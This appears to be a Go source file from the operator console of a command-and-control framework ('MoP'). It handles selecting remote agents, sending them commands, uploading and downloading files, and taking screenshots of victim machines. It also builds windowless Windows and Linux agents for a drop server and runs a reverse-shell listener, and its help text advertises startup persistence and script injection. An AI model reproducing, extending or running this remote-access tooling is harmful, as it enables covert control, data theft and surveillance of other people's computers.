package commands

import (
	"MoP/src/controllers"
	"MoP/src/messages"
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func ShowHandler(command []string, agent string) {
	if len(command) > 1 {
		switch command[1] {
		// executa a captura de agentes do pacote controllers
		case "agents":
			controllers.GetAgents()
		case "history":
			if agent != "" {
				controllers.GetHistory(agent, command)
			}
		case "modules":
			controllers.GetModules()
		default:
			fmt.Println()
			fmt.Printf("The parameter %s doesn't exists!\n", command[1])
			fmt.Println()
		}
	} else {
		fmt.Println()
		fmt.Println("To list the agents, use: show agents")
		fmt.Println()
	}
}

func SetAlias(command []string, agent string) {
	if len(command) > 1 {
		agentID, _ := strconv.Atoi(agent)
		resp := controllers.ChangeAlias(agentID, command[1])
		fmt.Println(resp)
	} else {
		fmt.Println()
		fmt.Println("You need to inform an alias!")
		fmt.Println()
	}
}

func SelectHandler(command []string) string {
	if len(command) > 1 {
		agentID, _ := strconv.Atoi(command[1])
		// valida se o agente existe com o pacote controllers
		if controllers.CheckAgents(uint64(agentID)) {
			selectedAgent := command[1]
			return selectedAgent
		} else {
			fmt.Println("\nThe selected agent doesn't exists!")
			fmt.Println("To list the agents, use: show agents")
			fmt.Println()
			return ""
		}

	} else {
		return ""
	}
}

func CommandHandler(agent string, command string) {
	command = strings.TrimSuffix(command, "\n")
	if len(command) > 0 {
		agentID, _ := strconv.Atoi(agent)
		controllers.SendCommand(uint64(agentID), command)
	}
}

func UploadFile(agent string, command []string) {
	if len(command) > 1 {
		agentID, _ := strconv.Atoi(agent)
		fileName := filepath.Base(command[1])
		err := controllers.SendFile(uint64(agentID), command[1], fileName)
		if err != nil {
			fmt.Println()

			fmt.Println()
		}
	} else {
		fmt.Println()
		fmt.Println("You need to inform the path of the file!")
		fmt.Println()
	}
}

func DownloadFile(agent string, command []string) {
	if len(command) > 1 {
		agentID, _ := strconv.Atoi(agent)
		fileName := filepath.Base(command[1])
		err := controllers.ReqFile(uint64(agentID), command[1], fileName, "download")
		if err != nil {
			fmt.Println()
			messages.ErrorMessage("download the file", err)
			fmt.Println()
		}

	} else {
		fmt.Println()
		fmt.Println("You need to inform the path of the file!")
		fmt.Println()
	}
}

func TakeScrenshot(agent string, command []string) {
	agentID, _ := strconv.Atoi(agent)
	ct := time.Now()
	fileName := "./ss-" + ct.Format("2006-01-02-15-04-05") + ".png"
	err := controllers.ReqFile(uint64(agentID), "screenshot", fileName, "screenshot")
	if err != nil {
		fmt.Println()
		fmt.Println("Error to take screenshot: ", err)
		fmt.Println()
	}
}

func BuildAgents(agentName string, host string) {
	path, _ := os.Getwd()
	outPath := filepath.Join(filepath.Dir(path), "drop", "agents", agentName)
	agentPath := filepath.Join(filepath.Dir(path), "agent", "agent.go")
	commands := [2]string{"GOOS=windows go build -ldflags -H=windowsgui  -o " + outPath + ".exe " + agentPath,
		"go build -o " + outPath + " " + agentPath}
	for _, command := range commands {
		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
		if err != nil {
			messages.ErrorMessage("build agent", err)
			return
		}
	}
	fmt.Println()
	fmt.Printf("[+] Agents URL:\n\t- %s/drop/agents/%s.exe\n\t- %s/drop/agents/%s", host, agentName, host, agentName)
	fmt.Println()
}

func Shell(agentId string, commands []string) {
	messages.WarningMessage("This is so loud and easy to detect!")
	messages.YellowBold.Printf("Are you sure? [y/N]: ")
	var resp string
	_, err := fmt.Scanln(&resp)
	if err != nil {
		messages.ErrorMessage("receive user option ", err)
		return
	}

	if strings.ToLower(resp) == "y" {
		var port = "8081"
		if len(commands) > 1 {
			port = commands[1]
		}

		messages.GreenBold.Printf("\nListening on port %s (Ctrl+C to return)...\n\n", port)

		ln, err := net.Listen("tcp", fmt.Sprintf(":%s", port))
		if err != nil {
			messages.ErrorMessage("bind the TCP port", err)
			return
		}
		defer ln.Close()

		c := make(chan os.Signal, 1)
		signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-c
			ln.Close()
		}()

		conn, err := ln.Accept()
		if err != nil {
			messages.ErrorMessage("accept the connection", err)
			return
		}
		defer conn.Close()

		reader := bufio.NewReader(os.Stdin)
		messages.OkMessage("Connection received!")
		for {
			fmt.Printf("Agent: %s>> ", agentId)
			command, _ := reader.ReadString('\n')
			command = strings.TrimSuffix(command, "\n")

			if strings.ToLower(command) == "exit" {
				break
			}

			conn.Write([]byte(command + "\n"))
			var length uint32
			err := binary.Read(conn, binary.LittleEndian, &length)
			if err != nil {
				messages.ErrorMessage("read the output length", err)
				continue
			}

			buffer := make([]byte, length)
			_, err = conn.Read(buffer)
			if err != nil {
				messages.ErrorMessage("read the output", err)
				continue
			}

			fmt.Println(string(buffer))
		}

		return

	} else {
		return
	}
}

func Help() string {
	help := `
	SERVER COMMANDS:

		!<command>: run SO command on server machine.

		alias <alias>: set an alias to an agent when one that agent is selected.

		build [name]: build Linux and Windows agents and put them on a File Server at https://server/drop/agents/ (default name "agent").

		help: show this help.
	
		show agents: list the active agents to interact.

		show modules: list the modules to inject on the agent machine.
			
		select <id>: select an agent by id to interact.


	AGENT COMMANDS:

		download <filepath>: download a file from agent machine.

		persist: make a copy of the agent to startup directory on Windows machines.

		ps: shows the process list running on agent machine.

		screenshot: take a screenshot from agent machine.

		shell [port]: initiate a TCP reverse shell listening on informated port (default 8081). (very easy to detect and not recomended)

		show history: list the command history when one agent is selected.

		sleep <time seconds>: change the sleep time before send response to server (default 10).

		upload <file path>: send a file to agent machine.

		use <module name>: inject the scripts listed on "show modules" command in the agent machine.
		
		`
	return help

}
